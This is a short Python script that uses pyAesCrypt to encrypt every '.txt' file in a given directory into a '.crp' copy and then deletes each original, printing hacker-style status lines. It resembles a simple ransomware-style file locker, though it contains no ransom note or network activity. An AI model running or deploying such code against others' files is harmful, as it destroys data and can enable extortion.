import os
import pyAesCrypt

from decrypt import *

def encryption(file, password):
    """For encryption"""
    buffer_size = 512 * 1024
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )
    os.remove(file)

def walking_by_dirs(Dir_ForEncryption, password):
    for name in os.listdir(Dir_ForEncryption):
        path = os.path.join(Dir_ForEncryption, name)
        if os.path.isfile(path):
            if name.endswith(".txt"):
                encryption(path, password)
                print('[+] - File encrypted')
            
